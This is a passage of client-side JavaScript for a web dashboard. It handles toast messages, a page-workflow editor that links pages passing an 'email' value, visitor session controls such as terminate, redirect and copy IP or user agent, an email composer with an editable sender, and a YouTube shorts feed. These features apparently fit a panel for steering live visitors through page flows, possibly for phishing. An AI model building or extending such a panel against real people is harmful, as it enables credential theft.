    if (type === 'success') {
        icon = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-status-success-light dark:text-status-success-dark" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>';
    } else if (type === 'error') {
        icon = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-status-error-light dark:text-status-error-dark" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>';
    } else {
        icon = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-status-info-light dark:text-status-info-dark" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></svg>';
    }

    toast.innerHTML = `${icon} <span>${message}</span>`;
    
    toast.style.opacity = '0';
    
    const toaster = document.getElementById('toaster');
    if (toaster) {
        activeToasts.push(toast);
        toaster.appendChild(toast);
        
        toast.style.transform = 'translate(-50%, -20px)';
        
        void toast.offsetWidth;
        
        updateToastPositions();
        
        toast.style.opacity = '1';
        
        if (activeToasts.length > 5) {
            const oldestToast = activeToasts.shift();
            oldestToast.style.opacity = '0';
            
            setTimeout(() => {
                if (toaster.contains(oldestToast)) {
                    toaster.removeChild(oldestToast);
                }
                updateToastPositions();
            }, 300);
        }

        setTimeout(() => {
            const index = activeToasts.indexOf(toast);
            if (index > -1) {
                toast.style.opacity = '0';
                
                setTimeout(() => {
                    const currentIndex = activeToasts.indexOf(toast);
                    if (currentIndex > -1) {
                        activeToasts.splice(currentIndex, 1);
                    }
                    
                    if (toaster.contains(toast)) {
                        toaster.removeChild(toast);
                    }
                    updateToastPositions();
                }, 300);
            }
        }, 3000);
    }
}

window.showToast = showToast;

function updateToastPositions() {
  const OVERLAP_OFFSET = 10;
  activeToasts.forEach((toast, index) => {
    const offset = index * OVERLAP_OFFSET;
    toast.style.zIndex = 1000 + index;
    toast.style.transform = `translate(-50%, ${offset}px)`;
  });
}

function toggleCollapsibleSection(section) {
  section.classList.toggle('open');
}


function isInWorkflowInfo(icon) {
  return icon.closest('#workflowPagesDisplay') !== null;
}


function createWorkflowInfoConnection(sourceIcon, targetIcon, sourcePageId, targetPageId, dataType, container) {
  
  const sourceRect = sourceIcon.getBoundingClientRect();
  const targetRect = targetIcon.getBoundingClientRect();
  const containerRect = container.getBoundingClientRect();

  const sourceX = sourceRect.left + sourceRect.width / 2 - containerRect.left;
  const sourceY = sourceRect.top + sourceRect.height / 2 - containerRect.top;
  const targetX = targetRect.left + targetRect.width / 2 - containerRect.left;
  const targetY = targetRect.top + targetRect.height / 2 - containerRect.top;

  const dx = targetX - sourceX;
  const dy = targetY - sourceY;
  const length = Math.sqrt(dx * dx + dy * dy);
  const angle = Math.atan2(dy, dx) * 180 / Math.PI;
  
  const connection = document.createElement('div');
  connection.className = 'icon-connection';
  connection.classList.add(`connection-${dataType}`);
  
  connection.style.position = 'absolute';
  connection.style.left = sourceX + 'px';
  connection.style.top = sourceY + 'px';
  connection.style.width = length + 'px';
  connection.style.transform = `rotate(${angle}deg)`;
  
  const iconWrapper = sourceIcon.querySelector('.icon-wrapper');
  
  if (iconWrapper) {
      const iconTypeClass = Array.from(iconWrapper.classList)
          .find(cls => cls.startsWith('icon-type-'));
      
      if (iconTypeClass) {
          const iconType = iconTypeClass.replace('icon-type-', '');
          
          connection.style.setProperty('background-color', `var(--icon-bg-${iconType})`, 'important');
          connection.style.setProperty('height', '3px', 'important');
          connection.style.setProperty('opacity', '1', 'important');
          
          sourceIcon.style.setProperty('box-shadow', `0 0 0 3px var(--icon-bg-${iconType})`, 'important');
          targetIcon.style.setProperty('box-shadow', `0 0 0 3px var(--icon-bg-${iconType})`, 'important');
          
          setTimeout(() => {
              sourceIcon.style.removeProperty('box-shadow');
              targetIcon.style.removeProperty('box-shadow');
          }, 800);
      }
  }
  
  connection.dataset.source = sourcePageId;
  connection.dataset.target = targetPageId;
  connection.dataset.type = dataType;
  
  container.appendChild(connection);
  return connection;
}

async function renderWorkflowInfo() {
  try {
      const initialConfigResponse = await fetch('/api/v1/config');
      if (!initialConfigResponse.ok) {
          throw new Error(`Failed to fetch initial config: ${initialConfigResponse.status}`);
      }
      const config = await initialConfigResponse.json();
      
      const workflowPagesDisplay = document.getElementById('workflowPagesDisplay');
      const workflowAvailablePages = document.getElementById('workflowAvailablePages');
      
      if (!workflowPagesDisplay || !workflowAvailablePages) {
          return;
      }
      
      const currentWorkflowPages = config.options?.workflow_pages || [];
      const availablePages = state.availablePages || [];
      
      const pageDataMap = {};
      availablePages.forEach(page => {
          const pageKey = page.id.replace(/^\/+/, '');
          pageDataMap[pageKey] = page;
      });
      
      const workflowContent = currentWorkflowPages.map(pageId => {
          const pageData = pageDataMap[pageId] || availablePages.find(p => p.id === pageId);
          return cardHTML(pageId, pageId, true, pageData);
      }).join('');
      
      const availablePagesContent = availablePages
          .map(page => cardHTML(page.id, page.id, false, page))
          .join('');
      
      workflowPagesDisplay.innerHTML = workflowContent;
      workflowAvailablePages.innerHTML = availablePagesContent;
      
      workflowPagesDisplay.querySelectorAll('.workflow-remove').forEach(button => {
          if (button.dataset.listenerAttached === 'true') return;
          button.dataset.listenerAttached = 'true';

          button.addEventListener('click', (e) => {
              e.preventDefault();
              e.stopPropagation();
              const pageIdToRemove = button.closest('.workflow-card, .card-preview')?.getAttribute('data-id');
              if (!pageIdToRemove) return;

              const cardElement = button.closest('.workflow-card, .card-preview');
              if (cardElement) {
                  cardElement.style.transition = 'opacity 0.2s, transform 0.2s';
                  cardElement.style.opacity = '0';
                  cardElement.style.transform = 'translateX(-10px)';
                  setTimeout(() => cardElement.remove(), 200);
              }

              const newWorkflowPages = currentWorkflowPages.filter(id => id !== pageIdToRemove);
              socket.emit('save_settings', { workflow_pages: newWorkflowPages }, () => {
                  iconConnectionSystem.scanForIcons();
              });
          });
      });

      workflowAvailablePages.querySelectorAll('.workflow-card').forEach(card => {
          if (card.dataset.listenerAttached === 'true') return;
          card.dataset.listenerAttached = 'true';

          card.addEventListener('click', () => {
              const pageIdToAdd = card.getAttribute('data-id');
              if (!pageIdToAdd || currentWorkflowPages.includes(pageIdToAdd)) return;

              const pageData = pageDataMap[pageIdToAdd];
              workflowPagesDisplay.insertAdjacentHTML('beforeend', cardHTML(pageIdToAdd, pageIdToAdd, true, pageData));
              
              const newCard = workflowPagesDisplay.lastElementChild;
              newCard.style.transition = 'opacity 0.2s, transform 0.2s';
              newCard.style.opacity = '1';
              newCard.style.transform = 'translateX(0)';

              const newWorkflowPages = [...currentWorkflowPages, pageIdToAdd];
              socket.emit('save_settings', { workflow_pages: newWorkflowPages }, () => {
                  iconConnectionSystem.scanForIcons();
              });
          });
      });
      
      workflowPagesDisplay.querySelectorAll('.workflow-card').forEach(card => {
          if (card.dataset.linkListenerAttached === 'true') return;
          card.dataset.linkListenerAttached = 'true';

          card.addEventListener('click', async (e) => {
              if (e.target.closest('.workflow-remove')) return;

              const pageId = card.getAttribute('data-id');
              if (!pageId) return;

              if (!window.currentConnection) {
                  window.currentConnection = {
                      from: pageId,
                      fromElement: card
                  };
                  card.classList.add('connecting');
              } else if (window.currentConnection.from !== pageId) {
                  const fromId = window.currentConnection.from;
                  const toId = pageId;

                  const infoConnectionContainer = document.getElementById('infoConnectionContainer');
                  if (infoConnectionContainer) {
                      const existingConnection = infoConnectionContainer.querySelector(
                          `.connection-line[data-source="${fromId}"][data-target="${toId}"][data-type="email"], ` +
                          `.connection-line[data-source="${toId}"][data-target="${fromId}"][data-type="email"]`
                      );

                      if (existingConnection) {
                          existingConnection.remove();
                          socket.emit('update_data_links', { 
                              action: 'remove', 
                              link: {
                                  from: existingConnection.dataset.source,
                                  to: existingConnection.dataset.target,
                                  from_value: existingConnection.dataset.type,
                                  to_value: existingConnection.dataset.type
                              }
                          });
                          showToast(`Removed connection between ${fromId} and ${toId}`, 'info');
                      } else {
                  const newLink = {
                      from: fromId,
                      to: toId,
                      from_value: "email",
                      to_value: "email"
                  };

                  socket.emit('update_data_links', { action: 'add', link: newLink }, (response) => {
                      if (response.status === 'success') {
                                  const sourceIcon = window.currentConnection.fromElement.querySelector('.workflow-icon[title^="Receives: email"]');
                                  const targetIcon = card.querySelector('.workflow-icon[title^="Required: email"]');

                                  if (sourceIcon && targetIcon) {
                                      createWorkflowInfoConnection(
                                          sourceIcon,
                                          targetIcon,
                                          fromId,
                                          toId,
                                          "email",
                                          infoConnectionContainer
                                      );
                                      showToast(`Connected: ${fromId} provides email to ${toId}`, 'success');
                                  }
              } else {
                                  showToast('Failed to create connection', 'error');
                      }
                  });
                      }
                  }

                  window.currentConnection.fromElement.classList.remove('connecting');
                  window.currentConnection = null;
              }
          });
      });
      
      ['workflowPagesDisplay', 'workflowAvailablePages'].forEach(containerId => {
          document.querySelectorAll(`#${containerId} li`).forEach((li) => {
              const isLastInContainer = Array.from(li.parentElement.children).indexOf(li) === li.parentElement.children.length - 1;
              li.classList.toggle('has-line', !isLastInContainer);
          });
      });
      
      if (config.data_links) {
          
          workflowPagesDisplay.style.position = 'relative';
          let infoConnectionContainer = document.getElementById('infoConnectionContainer');
          if (!infoConnectionContainer) {
              infoConnectionContainer = document.createElement('div');
              infoConnectionContainer.id = 'infoConnectionContainer';
              infoConnectionContainer.style.position = 'absolute';
              infoConnectionContainer.style.top = '0';
              infoConnectionContainer.style.left = '0';
              infoConnectionContainer.style.right = '0';
              infoConnectionContainer.style.bottom = '0';
              infoConnectionContainer.style.pointerEvents = 'none';
              infoConnectionContainer.style.zIndex = '1';
              workflowPagesDisplay.appendChild(infoConnectionContainer);
          }

          infoConnectionContainer.innerHTML = '';

          config.data_links.forEach(link => {
              const fromElement = workflowPagesDisplay.querySelector(`[data-id="${link.from}"]`);
              const toElement = workflowPagesDisplay.querySelector(`[data-id="${link.to}"]`);
              
              if (fromElement && toElement) {

                  const sourceIcon = fromElement.querySelector(`.workflow-icon[title^="Receives: ${link.from_value}"]`);
                  const targetIcon = toElement.querySelector(`.workflow-icon[title^="Required: ${link.from_value}"]`);

                  if (sourceIcon && targetIcon) {
                      createWorkflowInfoConnection(
                          sourceIcon,
                          targetIcon,
                          link.from,
                          link.to,
                          link.from_value,
                          infoConnectionContainer
                      );
                  } else {
                  }
              }
          });
      }
      
      iconConnectionSystem.scanForIcons();
      
  } catch (error) {
  }
}

function initEventListeners() {
    fetchConfiguration().then(() => {
        renderWorkflowInfo();
    });

    sessionsTab.addEventListener('click', () => setActiveTab('sessions'));
    emailTab.addEventListener('click', () => setActiveTab('email'));
    miscTab.addEventListener('click', () => {
        setActiveTab('misc');
        if (!window.youtubeApiAttempted) {
            window.youtubeApiAttempted = true;
            if (typeof window.YT === 'undefined' || typeof window.YT.Player === 'undefined') {
                loadYouTubeAPI();
            }
        }
        renderWorkflowInfo();
    });

    notificationsToggle.addEventListener('click', () => toggleDropdown('notifications'));
    settingsToggle.addEventListener('click', () => toggleDropdown('settings'));

    closeSessionManager.addEventListener('click', closeSessionManagerModal);
    terminateSessionBtn.addEventListener('click', () => {
        if (state.selectedSession) {
            terminateSession(state.selectedSession.id);
            closeSessionManagerModal();
        }
    });

    sendToUser.addEventListener('click', sendToUserAction);
    copyIp.addEventListener('click', handleCopyIp);
    copyUserAgent.addEventListener('click', handleCopyUserAgent);
    requiredInfoInput.addEventListener('input', handleRequiredInfoChange);

    sessionManagerTabs.forEach(tab =>
        tab.addEventListener('click', () => {
            const selectedTab = tab.getAttribute('data-tab');
            setSessionManagerTab(selectedTab);
        })
    );

    emailRecipient.addEventListener('input', handleEmailInputChange);
    emailSender.addEventListener('input', () => {
        updateEmailPreview();
        handleEmailInputChange();
    });
    emailSubject.addEventListener('input', handleEmailInputChange);
    emailTemplate.addEventListener('input', handleEmailInputChange);

    collapsibleSections.forEach(section => {
        const header = section.querySelector('.collapsible-header');
        if (header) {
            header.addEventListener('click', () => toggleCollapsibleSection(section));
        }
    });

    fetchAvailablePages();
    wsListener();
    updateUI();
    renderAvailablePages();
    setupUserInputWebSocket();
    updateEmailPreview();
}
initEventListeners();

  const container = document.getElementById('videoScrollerSection');
  const refreshButton = document.getElementById('refreshButton');
  const autoScrollToggle = document.getElementById('autoScrollToggle');

  let currentIndex = 0;
  let isLoading = false;
  let autoScrollEnabled = true;
  let isScrolling = false;  
  const playerMap = new Map();
  let youtubeApiLoadTimeout = null;

  function loadYouTubeAPI() {
    if (window.YT && window.YT.Player) {
      if (typeof window.onYouTubeIframeAPIReady === 'function') {
        window.onYouTubeIframeAPIReady();
      }
      return;
    }
    
    const existingScript = document.getElementById('youtubeApiScript') || document.querySelector('script[src="https://www.youtube.com/iframe_api"]');
    if (existingScript) {
      return;
    }

    const tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    tag.id = "youtubeApiScript"; 

    if (youtubeApiLoadTimeout) {
      clearTimeout(youtubeApiLoadTimeout);
    }

    youtubeApiLoadTimeout = setTimeout(() => {
      const ytScript = document.getElementById('youtubeApiScript');
      if (ytScript && ytScript.parentNode) {
        ytScript.parentNode.removeChild(ytScript);
      }
      window.youtubeApiAttempted = false; 
    }, 7000); 

    tag.onload = () => {
      if (youtubeApiLoadTimeout) clearTimeout(youtubeApiLoadTimeout);
    };
    tag.onerror = () => {
      if (youtubeApiLoadTimeout) clearTimeout(youtubeApiLoadTimeout);
      const ytScript = document.getElementById('youtubeApiScript');
      if (ytScript && ytScript.parentNode) {
        ytScript.parentNode.removeChild(ytScript); 
      }
      window.youtubeApiAttempted = false; 
    };
    document.head.appendChild(tag);
  }

  window.onYouTubeIframeAPIReady = function () {
    if (youtubeApiLoadTimeout) { 
        clearTimeout(youtubeApiLoadTimeout);
        youtubeApiLoadTimeout = null; 
    }
    document.querySelectorAll('iframe[data-src]:not([data-player-initialized])').forEach(initPlayer);
  };

  function initPlayer(iframe) {
    if (!iframe.dataset.src || iframe.dataset.playerInitialized === 'true') { 
      return;
    }
    iframe.src = iframe.dataset.src;
    iframe.dataset.playerInitialized = 'true'; 
    try {
      const player = new YT.Player(iframe, {
        events: {
          'onReady': onPlayerReady,
          'onStateChange': onPlayerStateChange,
          'onError': onPlayerError
        }
      });
      playerMap.set(iframe, player);
    } catch (error) {
      logErrorToServer(error);
    }
  }

  function onPlayerReady(event) {
  }

  function onPlayerStateChange(event) {
    if (event.data === YT.PlayerState.ENDED) {
      scrollToNextVideo();
    }
  }

  function onPlayerError(event) {
    logErrorToServer(error);
  }

  function appendVideos(videos) {

    container.innerHTML = "";
    videos.forEach((url) => {
      if (!url || url === "null") {
        return;
      }

      const shortDiv = document.createElement('div');
      shortDiv.className = 'short';
      shortDiv.style.opacity = '0'; 
      shortDiv.style.position = 'absolute';

      const embedWrapper = document.createElement('div');
      embedWrapper.className = 'embed-wrapper';

      const iframe = document.createElement('iframe');
      iframe.setAttribute('data-src', url); 
      iframe.setAttribute('allow', 'autoplay; encrypted-media; picture-in-picture');
      iframe.setAttribute('allowfullscreen', 'true');
      iframe.setAttribute('referrerpolicy', 'origin');
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation');

      embedWrapper.appendChild(iframe);
      shortDiv.appendChild(embedWrapper);
      container.appendChild(shortDiv);
    });

    registerLazyLoader();
  }

  function scrollToNextVideo() {
    if (!autoScrollEnabled || document.hidden || isScrolling) return;

    const shorts = document.querySelectorAll('.short');
    const nextIndex = currentIndex + 1;

    if (nextIndex < shorts.length) {
      isScrolling = true;
      currentIndex = nextIndex;
      const nextShort = shorts[nextIndex];
      nextShort.scrollIntoView({ behavior: 'smooth', block: 'start' });

      const iframe = nextShort.querySelector('iframe');
      const player = playerMap.get(iframe);
      if (player && typeof player.playVideo === 'function') {
        try {
          player.playVideo();
        } catch (error) {
          logErrorToServer(error);
        }
      }

      setTimeout(() => isScrolling = false, 1000);  
    } else {
      if (!isLoading) {
        isLoading = true;
        socket.emit('request_more_short_videos');
      }
    }
  }

  function registerLazyLoader() {
    const observer = new IntersectionObserver(entries => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          const iframe = entry.target.querySelector('iframe');
          if (iframe && !iframe.src) {
            iframe.src = iframe.dataset.src;
            initPlayer(iframe);
            entry.target.style.opacity = '1'; 
            entry.target.style.position = 'relative'; 
            const player = playerMap.get(iframe);
            if (player && typeof player.playVideo === 'function') {
              player.playVideo();
            }
          }
        }
      });
    }, { threshold: 0.5 });

    document.querySelectorAll('.short').forEach(short => {
      observer.observe(short);
    });
  }

  function loadVideos() {
    if (isLoading) return;
    isLoading = true;
    socket.emit('request_initial_short_videos');
  }

  container.addEventListener('click', loadVideos);

  socket.on('connect', () => {
  });

  socket.on('placeholder_updated', (data) => {
    try {
      showToast('Placeholder updated successfully', 'success');
    } catch (error) {
      logErrorToServer(error);
    }
  });

  socket.on('short_videoList', (data) => {
    if (data.videos.length > 0) {
      appendVideos(data.videos);
    }
  });

  socket.on('short_moreVideos', (data) => {
    if (data.videos.length > 0) {
      appendVideos(data.videos);
      isLoading = false;
    }
  });

  if (refreshButton) {
  refreshButton.addEventListener('click', () => {
    socket.emit('refresh_short_videos');
  });
  }

  container.addEventListener('wheel', (event) => {
    event.preventDefault();
    const scrollThreshold = 100; 
    if (event.deltaY > scrollThreshold) {
      scrollToNextVideo();
    }
  });

  loadYouTubeAPI();
});